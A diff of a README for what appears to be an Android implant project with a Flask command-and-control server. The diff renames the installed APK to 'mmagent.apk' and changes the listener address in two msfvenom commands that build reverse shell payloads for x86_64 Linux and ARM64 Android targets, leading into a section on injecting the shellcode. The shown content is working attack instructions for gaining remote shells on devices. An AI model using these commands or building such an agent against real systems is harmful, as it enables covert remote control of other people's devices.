@@ -110,7 +110,7 @@ From `android_agent/`:
 
 ```bash
 ./gradlew assembleDebug
-adb install app/build/outputs/apk/debug/app-debug.apk
+adb install app/build/outputs/apk/debug/mmagent.apk
 ```
 
 ### 2. Run the Flask C2 Server
@@ -163,10 +163,10 @@ Use `msfvenom` to create a reverse shell payload:
 
 ```bash
 # x86_64 (Linux)
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.2 LPORT=4444 -f raw -o reverse_shell.bin
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o reverse_shell.bin
 
 # ARM64 (Android target using NDK or Termux)
-msfvenom -p linux/aarch64/shell_reverse_tcp LHOST=10.0.2.2 LPORT=4444 -f raw -o reverse_shell.bin
+msfvenom -p linux/aarch64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o reverse_shell.bin
 ```
 
 ### Inject the Shellcode
